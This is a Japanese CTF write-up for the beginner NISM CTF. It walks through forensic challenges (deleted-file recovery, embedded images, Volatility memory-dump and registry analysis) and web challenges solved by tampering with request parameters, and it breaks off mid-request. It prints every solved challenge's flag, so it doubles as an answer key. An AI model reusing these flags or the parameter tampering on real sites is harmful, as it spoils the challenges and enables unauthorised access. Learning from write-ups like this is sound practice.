# NISM CTF
2022年12月10日, 11日に開催されたNISM(Nagasaki Info-Sec Meetup)というイベントと連動している初心者向けのCTFとなります。

本CTFはNISMに参加されていない方でも気軽にご参加いただけます。

2022年12月17日(土) 14:00(JST) ～ 2022年12月25日(日) 14:00(JST)
## Forensic
### Lost USB memory
> あっ、大切なUSBメモリを紛失してしまった。まぁでも重要なデータは削除してたから大丈夫でしょ。

promlem.binを与えられる。

Autopsyで開くと、削除されたファイル_flag.pdfが見つかる。

PDFに書かれているフラグを回答して正解。

> NISM{1t_1s_34sy_t0_r3st0r3_d3l3t3d_f1l3s}

### Hidden files
> 長崎で撮った写真を集めてみました。画像に埋め込まれているflagを見つけることはできるかな？

JPEG形式のファイルを4個与えられる。

青い空を見上げればいつもそこに白い猫 for うさみみハリケーンで開き、「ファイル・データ抽出」を選択。

「検索実行」すると別のJPEGファイルが埋め込まれていることが分かる。

4個のファイルにフラグの断片が書かれているので、それを結合して回答する。

> NISM{5pl1tt3d_1mp0rt4nt_f1l35_1nt0_53v3r4l_p4rt5}

### A file is opening

> とあるプログラムが重要なファイルを開いているみたい...

まずはVolatility3を導入する。今回はWSL環境を使った。

https://github.com/volatilityfoundation/volatility3

```sh
[root]# git clone https://github.com/volatilityfoundation/volatility3.git
Cloning into 'volatility3'...
remote: Enumerating objects: 29464, done.
remote: Counting objects: 100% (586/586), done.
remote: Compressing objects: 100% (326/326), done.
remote: Total 29464 (delta 289), reused 521 (delta 256), pack-reused 28878
Receiving objects: 100% (29464/29464), 5.97 MiB | 8.48 MiB/s, done.
Resolving deltas: 100% (22250/22250), done.
[root]# cd volatility3/
[root]# python3 vol
vol.py         vol.spec       volatility3/   volshell.py    volshell.spec
[root]# python3 vol.py -h
Volatility 3 Framework 2.4.1
usage: volatility [-h] [-c CONFIG] [--parallelism [{processes,threads,off}]] [-e EXTEND] [-p PLUGIN_DIRS]
                  [-s SYMBOL_DIRS] [-v] [-l LOG] [-o OUTPUT_DIR] [-q] [-r RENDERER] [-f FILE] [--write-config]
                  [--save-config SAVE_CONFIG] [--clear-cache] [--cache-path CACHE_PATH] [--offline]
                  [--single-location SINGLE_LOCATION] [--stackers [STACKERS ...]]
                  [--single-swap-locations [SINGLE_SWAP_LOCATIONS ...]]
                  plugin ...
```

与えられたDMPファイルを読み込み、プロセスを確認する。
```sh
[root]# python3 vol.py -f /mnt/d/Win10_MEMORY.DMP windows.info
Volatility 3 Framework 2.4.1
Progress:  100.00               PDB scanning finished
Variable        Value

Kernel Base     0x81674000
DTB     0x1a8000
Symbols file:///root/volatility3/volatility3/symbols/windows/ntkrpamp.pdb/78C36230DCC38A999E9C6C00C3EC5823-1.json.xz
Is64Bit False
IsPAE   True
layer_name      0 WindowsIntelPAE
memory_layer    1 WindowsCrashDump32Layer
base_layer      2 FileLayer
KdDebuggerDataBlock     0x81920830
NTBuildLab      19041.1.x86fre.vb_release.191206
CSDVersion      0
KdVersionBlock  0x81922f70
Major/Minor     15.19041
MachineType     332
KeNumberProcessors      1
SystemTime      2022-07-15 23:07:03
NtSystemRoot    C:\Windows
NtProductType   NtProductWinNt
NtMajorVersion  10
NtMinorVersion  0
PE MajorOperatingSystemVersion  10
PE MinorOperatingSystemVersion  0
PE Machine      332
PE TimeDateStamp        Mon Dec 19 22:38:28 1983
[root]# python3 vol.py -f /mnt/d/Win10_MEMORY.DMP windows.pslist.PsList
Volatility 3 Framework 2.4.1
Progress:  100.00               PDB scanning finished
PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output

4       0       System  0x8636e640      139     -       N/A     False   2022-07-15 23:04:19.000000      N/A     Disabled
72      4       Registry        0x87e32640      4       -       N/A     False   2022-07-15 23:04:07.000000      N/A     Disabled
348     4       smss.exe        0x8f01a640      2       -       N/A     False   2022-07-15 23:04:19.000000      N/A     Disabled
436     424     csrss.exe       0x8f70f040      9       -       0       False   2022-07-15 23:04:38.000000      N/A     Disabled
532     424     wininit.exe     0x8ca72800      1       -       0       False   2022-07-15 23:04:38.000000      N/A     Disabled
540     524     csrss.exe       0x8f022540      11      -       1       False   2022-07-15 23:04:38.000000      N/A     Disabled
600     524     winlogon.exe    0x92a3c040      4       -       1       False   2022-07-15 23:04:38.000000      N/A     Disabled
624     532     services.exe    0x92a40680      7       -       0       False   2022-07-15 23:04:38.000000      N/A     Disabled
632     532     lsass.exe       0x92a51040      10      -       0       False   2022-07-15 23:04:38.000000      N/A     Disabled
744     532     fontdrvhost.ex  0x92a4e680      5       -       0       False   2022-07-15 23:04:38.000000      N/A     Disabled
756     624     svchost.exe     0x92a5a040      17      -       0       False   2022-07-15 23:04:38.000000      N/A     Disabled
792     600     fontdrvhost.ex  0x8f70b040      5       -       1       False   2022-07-15 23:04:39.000000      N/A     Disabled
856     624     svchost.exe     0x92aa0440      9       -       0       False   2022-07-15 23:04:39.000000      N/A     Disabled
936     600     dwm.exe 0x92ac5680      17      -       1       False   2022-07-15 23:04:39.000000      N/A     Disabled
1016    624     svchost.exe     0x92b4c040      68      -       0       False   2022-07-15 23:04:39.000000      N/A     Disabled
1024    624     svchost.exe     0x92b50040      12      -       0       False   2022-07-15 23:04:39.000000      N/A     Disabled
1052    624     svchost.exe     0x92b5c040      12      -       0       False   2022-07-15 23:04:39.000000      N/A     Disabled
1072    624     svchost.exe     0x92b5c7c0      14      -       0       False   2022-07-15 23:04:39.000000      N/A     Disabled
1176    624     svchost.exe     0x92b68680      23      -       0       False   2022-07-15 23:04:39.000000      N/A     Disabled
1184    624     svchost.exe     0x92b72040      3       -       0       False   2022-07-15 23:04:39.000000      N/A     Disabled
1264    624     svchost.exe     0x92b7c680      29      -       0       False   2022-07-15 23:04:40.000000      N/A     Disabled
1400    4       MemCompression  0x92bb3300      26      -       N/A     False   2022-07-15 23:04:40.000000      N/A     Disabled
1468    624     svchost.exe     0x92bc7040      18      -       0       False   2022-07-15 23:04:40.000000      N/A     Disabled
1576    624     svchost.exe     0x99c97040      7       -       0       False   2022-07-15 23:04:41.000000      N/A     Disabled
1712    624     svchost.exe     0x8caac600      3       -       0       False   2022-07-15 23:04:41.000000      N/A     Disabled
1736    624     svchost.exe     0x99d0b040      4       -       0       False   2022-07-15 23:04:41.000000      N/A     Disabled
1852    624     spoolsv.exe     0x86362880      9       -       0       False   2022-07-15 23:04:41.000000      N/A     Disabled
1868    624     svchost.exe     0x99d0b7c0      14      -       0       False   2022-07-15 23:04:41.000000      N/A     Disabled
440     624     svchost.exe     0x86372040      16      -       0       False   2022-07-15 23:04:42.000000      N/A     Disabled
1240    624     MsMpEng.exe     0x8635d680      25      -       0       False   2022-07-15 23:04:42.000000      N/A     Disabled
1456    624     vmtoolsd.exe    0x863c8140      12      -       0       False   2022-07-15 23:04:42.000000      N/A     Disabled
268     624     vm3dservice.ex  0x863c88c0      3       -       0       False   2022-07-15 23:04:42.000000      N/A     Disabled
312     624     svchost.exe     0x863ce840      12      -       0       False   2022-07-15 23:04:43.000000      N/A     Disabled
424     624     VGAuthService.  0x863cf840      3       -       0       False   2022-07-15 23:04:43.000000      N/A     Disabled
2064    268     vm3dservice.ex  0x87e0a680      3       -       1       False   2022-07-15 23:04:43.000000      N/A     Disabled
2408    624     dllhost.exe     0x87e29680      18      -       0       False   2022-07-15 23:04:45.000000      N/A     Disabled
2552    624     dllhost.exe     0x9b176840      13      -       0       False   2022-07-15 23:04:46.000000      N/A     Disabled
2708    624     msdtc.exe       0x9b16c040      11      -       0       False   2022-07-15 23:04:47.000000      N/A     Disabled
2744    756     WmiPrvSE.exe    0x9f801080      10      -       0       False   2022-07-15 23:04:47.000000      N/A     Disabled
2932    624     VSSVC.exe       0x9f847040      4       -       0       False   2022-07-15 23:04:48.000000      N/A     Disabled
2976    624     svchost.exe     0x9b162040      5       -       0       False   2022-07-15 23:04:49.000000      N/A     Disabled
3048    624     NisSrv.exe      0x9b1ea600      5       -       0       False   2022-07-15 23:04:49.000000      N/A     Disabled
3108    624     svchost.exe     0x9f801800      14      -       1       False   2022-07-15 23:04:51.000000      N/A     Disabled
3116    1016    sihost.exe      0x9b16a800      13      -       1       False   2022-07-15 23:04:51.000000      N/A     Disabled
3204    1016    MicrosoftEdgeU  0x9b04a040      5       -       0       False   2022-07-15 23:04:51.000000      N/A     Disabled
3220    1016    taskhostw.exe   0x9f809080      10      -       1       False   2022-07-15 23:04:51.000000      N/A     Disabled
3312    1024    ctfmon.exe      0x9f8b9040      17      -       1       False   2022-07-15 23:04:51.000000      N/A     Disabled
3568    600     userinit.exe    0xa0c1d840      0       -       1       False   2022-07-15 23:04:53.000000      2022-07-15 23:05:23.000000      Disabled
3652    3568    explorer.exe    0x9f854040      78      -       1       False   2022-07-15 23:04:53.000000      N/A     Disabled
3676    624     svchost.exe     0x9f8be640      11      -       0       False   2022-07-15 23:04:54.000000      N/A     Disabled
3952    624     svchost.exe     0xa0cf3840      7       -       1       False   2022-07-15 23:04:57.000000      N/A     Disabled
732     756     SearchApp.exe   0xa2065300      21      -       1       False   2022-07-15 23:05:02.000000      N/A     Disabled
2612    756     RuntimeBroker.  0xa0cf6040      13      -       1       False   2022-07-15 23:05:04.000000      N/A     Disabled
3284    756     StartMenuExper  0xa2021680      22      -       1       False   2022-07-15 23:05:05.000000      N/A     Disabled
3500    756     WmiPrvSE.exe    0xa0d42040      13      -       0       False   2022-07-15 23:05:05.000000      N/A     Disabled
4084    756     RuntimeBroker.  0xa20b4800      13      -       1       False   2022-07-15 23:05:09.000000      N/A     Disabled
3628    624     svchost.exe     0xa209f540      8       -       0       False   2022-07-15 23:05:09.000000      N/A     Disabled
3140    756     SearchApp.exe   0xa5a2f600      33      -       1       False   2022-07-15 23:05:10.000000      N/A     Disabled
4288    624     SearchIndexer.  0xa5a53680      19      -       0       False   2022-07-15 23:05:12.000000      N/A     Disabled
4392    756     SkypeBackgroun  0xa5a43040      4       -       1       False   2022-07-15 23:05:14.000000      N/A     Disabled
4496    756     RuntimeBroker.  0x8b890840      7       -       1       False   2022-07-15 23:05:17.000000      N/A     Disabled
4756    624     WmiApSrv.exe    0xa0d1c040      5       -       0       False   2022-07-15 23:05:21.000000      N/A     Disabled
4884    756     TextInputHost.  0xa0da3040      20      -       1       False   2022-07-15 23:05:23.000000      N/A     Disabled
5128    756     smartscreen.ex  0xa6c27800      10      -       1       False   2022-07-15 23:05:28.000000      N/A     Disabled
5196    3652    SecurityHealth  0xa6c24680      7       -       1       False   2022-07-15 23:05:29.000000      N/A     Disabled
5224    624     SecurityHealth  0xa0d12680      14      -       0       False   2022-07-15 23:05:29.000000      N/A     Disabled
5288    3652    vmtoolsd.exe    0xa0da7040      6       -       1       False   2022-07-15 23:05:30.000000      N/A     Disabled
5332    3652    OneDrive.exe    0xa6c32640      16      -       1       False   2022-07-15 23:05:31.000000      N/A     Disabled
5512    756     dllhost.exe     0xa5a307c0      12      -       1       False   2022-07-15 23:05:36.000000      N/A     Disabled
5656    3652    cmd.exe 0xa5a02640      2       -       1       False   2022-07-15 23:05:38.000000      N/A     Disabled
5676    5656    conhost.exe     0xa5a07040      5       -       1       False   2022-07-15 23:05:38.000000      N/A     Disabled
4656    5656    notepad.exe     0x9f8477c0      5       -       1       False   2022-07-15 23:06:27.000000      N/A     Disabled
3744    624     sppsvc.exe      0x863536c0      7       -       0       False   2022-07-15 23:06:45.000000      N/A     Disabled
4320    624     svchost.exe     0x92be1680      13      -       0       False   2022-07-15 23:06:46.000000      N/A     Disabled
[root]# python3 vol.py -f /mnt/d/Win10_MEMORY.DMP windows.cmdline.CmdLine
Volatility 3 Framework 2.4.1
Progress:  100.00               PDB scanning finished
PID     Process Args

4       System  Required memory at 0x10 is not valid (process exited?)
72      Registry        Required memory at 0x10 is not valid (process exited?)
348     smss.exe        \SystemRoot\System32\smss.exe
436     csrss.exe       %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
532     wininit.exe     wininit.exe
540     csrss.exe       %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
600     winlogon.exe    winlogon.exe
624     services.exe    C:\Windows\system32\services.exe
632     lsass.exe       C:\Windows\system32\lsass.exe
744     fontdrvhost.ex  "fontdrvhost.exe"
756     svchost.exe     C:\Windows\system32\svchost.exe -k DcomLaunch -p
792     fontdrvhost.ex  "fontdrvhost.exe"
856     svchost.exe     C:\Windows\system32\svchost.exe -k RPCSS -p
936     dwm.exe "dwm.exe"
1016    svchost.exe     C:\Windows\system32\svchost.exe -k netsvcs -p
1024    svchost.exe     C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
1052    svchost.exe     C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
1072    svchost.exe     C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p
1176    svchost.exe     C:\Windows\system32\svchost.exe -k LocalService -p
1184    svchost.exe     C:\Windows\system32\svchost.exe -k LocalService -p
1264    svchost.exe     C:\Windows\System32\svchost.exe -k wsappx -p
1400    MemCompression  Required memory at 0x10 is not valid (process exited?)
1468    svchost.exe     C:\Windows\System32\svchost.exe -k NetworkService -p
1576    svchost.exe     C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
1712    svchost.exe     C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
1736    svchost.exe     C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
1852    spoolsv.exe     C:\Windows\System32\spoolsv.exe
1868    svchost.exe     C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
440     svchost.exe     C:\Windows\System32\svchost.exe -k utcsvc -p
1240    MsMpEng.exe     "C:\Program Files\Windows Defender\MsMpEng.exe"
1456    vmtoolsd.exe    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
268     vm3dservice.ex  C:\Windows\system32\vm3dservice.exe
312     svchost.exe     C:\Windows\System32\svchost.exe -k netsvcs
424     VGAuthService.  "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
2064    vm3dservice.ex  vm3dservice.exe -n
2408    dllhost.exe     C:\Windows\system32\dllhost.exe /Processid:{6F36B820-3DE5-4E34-8EF9-A7238575CC71}
2552    dllhost.exe     C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
2708    msdtc.exe       C:\Windows\System32\msdtc.exe
2744    WmiPrvSE.exe    C:\Windows\system32\wbem\wmiprvse.exe
2932    VSSVC.exe       C:\Windows\system32\vssvc.exe
2976    svchost.exe     C:\Windows\system32\svchost.exe -k appmodel -p
3048    NisSrv.exe      "C:\Program Files\Windows Defender\NisSrv.exe"
3108    svchost.exe     C:\Windows\system32\svchost.exe -k UnistackSvcGroup
3116    sihost.exe      sihost.exe
3204    MicrosoftEdgeU  "C:\Program Files\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /c
3220    taskhostw.exe   taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
3312    ctfmon.exe      "ctfmon.exe"
3568    userinit.exe    Required memory at 0x30cf010 is not valid (process exited?)
3652    explorer.exe    C:\Windows\Explorer.EXE
3676    svchost.exe     C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted
3952    svchost.exe     C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p
732     SearchApp.exe   "C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe" -ServerName:ShellFeedsUI.AppX88fpyyrd21w8wqe62wzsjh5agex7tf1e.mca
2612    RuntimeBroker.  C:\Windows\System32\RuntimeBroker.exe -Embedding
3284    StartMenuExper  "C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe" -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca
3500    WmiPrvSE.exe    C:\Windows\system32\wbem\wmiprvse.exe
4084    RuntimeBroker.  C:\Windows\System32\RuntimeBroker.exe -Embedding
3628    svchost.exe     C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation -p
3140    SearchApp.exe   "C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca
4288    SearchIndexer.  C:\Windows\system32\SearchIndexer.exe /Embedding
4392    SkypeBackgroun  "C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.53.77.0_x86__kzf8qxf38zg5c\SkypeBackgroundHost.exe" -ServerName:SkypeBackgroundHost
4496    RuntimeBroker.  C:\Windows\System32\RuntimeBroker.exe -Embedding
4756    WmiApSrv.exe    C:\Windows\system32\wbem\WmiApSrv.exe
4884    TextInputHost.  "C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\InputApp\TextInputHost.exe" -ServerName:InputApp.AppX9jnwykgrccxc8by3hsrsh07r423xzvav.mca
5128    smartscreen.ex  C:\Windows\System32\smartscreen.exe -Embedding
5196    SecurityHealth  "C:\Windows\System32\SecurityHealthSystray.exe"
5224    SecurityHealth  C:\Windows\system32\SecurityHealthService.exe
5288    vmtoolsd.exe    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
5332    OneDrive.exe    "C:\Users\Koito_Yuu\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
5512    dllhost.exe     C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}
5656    cmd.exe "C:\Windows\system32\cmd.exe"
5676    conhost.exe     \??\C:\Windows\system32\conhost.exe 0x4
4656    notepad.exe     C:\Windows\system32\notepad.exe  C:\Users\Koito_Yuu\Desktop\flag\base64\TklTTXtNM20wcnlfZHVtcF90Mzc3X3U1XzV0NHQzXzBmX3RoM19QQ18xbl90aDNfbTBtM250fQ==
3744    sppsvc.exe      C:\Windows\system32\sppsvc.exe
4320    svchost.exe     C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
```

Windowsのメモ帳がflagフォルダ配下のファイルを開いている様子。
```
[root]# python3 vol.py -f /mnt/d/Win10_MEMORY.DMP windows.cmdline.CmdLine | grep flag
4656ressnotepad.exe     C:\Windows\system32\notepad.exe  C:\Users\Koito_Yuu\Desktop\flag\base64\TklTTXtNM20wcnlfZHVtcF90Mzc3X3U1XzV0NHQzXzBmX3RoM19QQ18xbl90aDNfbTBtM250fQ==
```
フォルダの一部がBase64エンコードされた文字列になっている。

Base64デコードして得られるフラグを回答して正解。
```
[root]# echo TklTTXtNM20wcnlfZHVtcF90Mzc3X3U1XzV0NHQzXzBmX3RoM19QQ18xbl90aDNfbTBtM250fQ== | base64 -d
NISM{M3m0ry_dump_t377_u5_5t4t3_0f_th3_PC_1n_th3_m0m3nt}
```

### Find Reg Value

> このPCにOSをインストールしたのはいつだろう？
> ※この問題のフラグはNISM{ }のカッコの中に年・月・日・時・分・秒をアンダーバー区切りにして入れたものです．
> 例)
> 答えとなる日時が1970/01/01 10:20:30である場合，フラグは
> NISM{1970_01_01_10_20_30}
> となります

Windowsのインストール日時はレジストリ上では以下に保存されている。
> HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
> InstallDate

```sh
[root]# python3 vol.py -f /mnt/d/Win10_MEMORY.DMP windows.registry.hivelist.HiveList
Volatility 3 Framework 2.4.1
Progress:  100.00               PDB scanning finished
Offset  FileFullPath    File output

0x8800b008              Disabled
0x8800f008      \REGISTRY\MACHINE\SYSTEM        Disabled
0x88077008      \REGISTRY\MACHINE\HARDWARE      Disabled
0x926d3028      \Device\HarddiskVolume1\Boot\BCD        Disabled
0x8edec008      \SystemRoot\System32\Config\SOFTWARE    Disabled
0x8b933028      \SystemRoot\System32\Config\DEFAULT     Disabled
0x8d701028      \SystemRoot\System32\Config\SECURITY    Disabled
0x9587a220      \SystemRoot\System32\Config\SAM Disabled
0x958fc008      \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT        Disabled
0x982dc008      \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT  Disabled
0x982c9008      \SystemRoot\System32\Config\BBI Disabled
0x9615f008      \??\C:\Users\Anya\ntuser.dat    Disabled
0x961d8028      \??\C:\Users\Anya\AppData\Local\Microsoft\Windows\UsrClass.dat  Disabled
0xa0638008      \SystemRoot\System32\config\DRIVERS     Disabled
0xa0e3b008      \??\C:\Windows\AppCompat\Programs\Amcache.hve   Disabled
0xa06c7008      \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.Windows.Search_1.14.2.19041_neutral_neutral_cw5n1h2txyewy\ActivationStore.dat     Disabled
0x9af94008      \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\MicrosoftWindows.Client.CBS_120.2212.3920.0_x86__cw5n1h2txyewy\ActivationStore.dat  Disabled
0x9af97008      \??\C:\Users\Anya\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\Settings\settings.dat   Disabled
0xa06c9008      \??\C:\Users\Anya\AppData\Local\Packages\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\Settings\settings.dat        Disabled
0xa5c69008      \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.Windows.StartMenuExperienceHost_10.0.19041.1023_neutral_neutral_cw5n1h2txyewy\ActivationStore.dat Disabled
0xa6e32220      \??\C:\Users\Anya\AppData\Local\Packages\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\Settings\settings.dat  Disabled
0xa8265008      \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.SkypeApp_14.53.77.0_x86__kzf8qxf38zg5c\ActivationStore.dat        Disabled
```

今回参照したいのは`\SystemRoot\System32\Config\SOFTWARE`のため、`0x8edec008`を確認する。

```sh
[root]# python3 vol.py -f /mnt/d/Win10_MEMORY.DMP windows.registry.printkey --offset 0x8edec008
Volatility 3 Framework 2.4.1
Progress:  100.00               PDB scanning finished
Last Write Time Hive Offset     Type    Key     Name    Data    Volatile

2022-07-02 04:14:46.000000      0x8edec008      Key     \SystemRoot\System32\Config\SOFTWARE    Classes         False
2022-07-02 04:14:46.000000      0x8edec008      Key     \SystemRoot\System32\Config\SOFTWARE    Clients         False
2022-07-02 04:14:46.000000      0x8edec008      Key     \SystemRoot\System32\Config\SOFTWARE    DefaultUserEnvironment          False
2022-07-02 04:14:46.000000      0x8edec008      Key     \SystemRoot\System32\Config\SOFTWARE    Google          False
2022-07-02 04:14:46.000000      0x8edec008      Key     \SystemRoot\System32\Config\SOFTWARE    Intel           False
2022-07-02 04:14:46.000000      0x8edec008      Key     \SystemRoot\System32\Config\SOFTWARE    Microsoft               False
2022-07-02 04:14:46.000000      0x8edec008      Key     \SystemRoot\System32\Config\SOFTWARE    ODBC            False
2022-07-02 04:14:46.000000      0x8edec008      Key     \SystemRoot\System32\Config\SOFTWARE    OEM             False
2022-07-02 04:14:46.000000      0x8edec008      Key     \SystemRoot\System32\Config\SOFTWARE    OpenSSH         False
2022-07-02 04:14:46.000000      0x8edec008      Key     \SystemRoot\System32\Config\SOFTWARE    Partner         False
2022-07-02 04:14:46.000000      0x8edec008      Key     \SystemRoot\System32\Config\SOFTWARE    Policies                False
2022-07-02 04:14:46.000000      0x8edec008      Key     \SystemRoot\System32\Config\SOFTWARE    RegisteredApplications          False
2022-07-02 04:14:46.000000      0x8edec008      Key     \SystemRoot\System32\Config\SOFTWARE    VMware, Inc.            False
2022-07-02 04:14:46.000000      0x8edec008      Key     \SystemRoot\System32\Config\SOFTWARE    Windows         False
```
Microsoftが見えているので、ここで合っていそう。

Keyを指定して必要な箇所だけ抜き出す。
```sh
[root]# python3 vol.py -f /mnt/d/Win10_MEMORY.DMP windows.registry.printkey --key "Microsoft\Windows NT\CurrentVersion" | grep Install
2022-07-09 12:20:01.000000      0x8edec008ng finREG_SZ  \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion        InstallationType        "Client"        False
2022-07-09 12:20:01.000000      0x8edec008      REG_DWORD       \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion        InstallDate     1656734456      False
2022-07-09 12:20:01.000000      0x8edec008      REG_QWORD       \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows NT\CurrentVersion        InstallTime     133012080566588255      False
```
`InstallTime`が`133012080566588255`だと分かる。

コマンドプロンプトを開き、w32tmで変換する。
```cmd
>w32tm /ntte 133012080566588255
153949 04:00:56.6588255 - 2022/07/02 13:00:56
```

指定した形式のフラグにして回答する。
> NISM{2022_07_02_13_00_56}

## Web

### 超、易問！
> NISMのテーマカラーは何色でしょうか？

ページにアクセスすると「What's NISM theme color?」のメッセージとともにwhite,red,green,yellow,greyの選択肢が表示される。

NISMのイメージカラーはおそらく青でblue。

とりあえず赤・redを選んで回答してみる。

```http
GET https://easy-quiz.siebold-cyber.net/?color=red HTTP/1.1
Host: easy-quiz.siebold-cyber.net
Connection: keep-alive
sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://easy-quiz.siebold-cyber.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: ja,en-US;q=0.9,en;q=0.8,ko;q=0.7

```

```http
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 20 Dec 2022 14:03:53 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 678
Connection: keep-alive
Vary: Accept-Encoding

<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex">
    <link rel="stylesheet" href="stylesheet.css">
    <title>NISM Quiz</title>
</head>
<body>
    <h1>-- Quiz --<br>What's NISM theme color?</h1>
    <div id="colors" class="box" style="background-color:lightcoral">
        <a href="?color=white">white</a><br><a href="?color=red">red</a><br><a href="?color=green">green</a><br><a href="?color=yellow">yellow</a><br><a href="?color=grey">grey</a><br>    </div>
    <div class="box">red? It's not correct...</div></body>
</html>
```

パラメータ`color`を`blue`に変更してアクセスする。

```http
GET https://easy-quiz.siebold-cyber.net/?color=blue HTTP/1.1
Host: easy-quiz.siebold-cyber.net
Connection: keep-alive
Cache-Control: max-age=0
sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: ja,en-US;q=0.9,en;q=0.8,ko;q=0.7

```

```http
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 20 Dec 2022 14:03:57 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 703
Connection: keep-alive
Vary: Accept-Encoding

<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex">
    <link rel="stylesheet" href="stylesheet.css">
    <title>NISM Quiz</title>
</head>
<body>
    <h1>-- Quiz --<br>What's NISM theme color?</h1>
    <div id="colors" class="box" style="background-color:skyblue">
        <a href="?color=white">white</a><br><a href="?color=red">red</a><br><a href="?color=green">green</a><br><a href="?color=yellow">yellow</a><br><a href="?color=grey">grey</a><br>    </div>
    <div class="box">Exactly! It's correct!<br>NISM{7h1s_ls_4_GE7_qu3ry.}</div></body>
</html>
```


表示されたフラグを回答して正解。

> NISM{7h1s_ls_4_GE7_qu3ry.}

#### frog, frog, frog
> 蛙好きの友人が、蛙と名の付く文学作品を集めたサイトを作ったらしい。せっかくだから見てみようか。

ページにアクセスすると一覧に`frogs`に関するタイトルが並んでおり、その中にひとつだけ`The flag hiding`が紛れ込んでいる。

一覧の下にはプルダウンがあるが、すべてのタイトルは記載されていない。

任意のタイトルを選択し、リクエスト中のパラメータを`The flag hiding`と、その公開年とされている`1980`に変更する。

```http
POST https://frog-works-collection.siebold-cyber.net/ HTTP/1.1
Host: frog-works-collection.siebold-cyber.net
Connection: keep-alive
Content-Length: 32
Cache-Control: max-age=0
sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://frog-works-collection.siebold-cyber.net
Content-Type: application/x-www-form-urlencoded
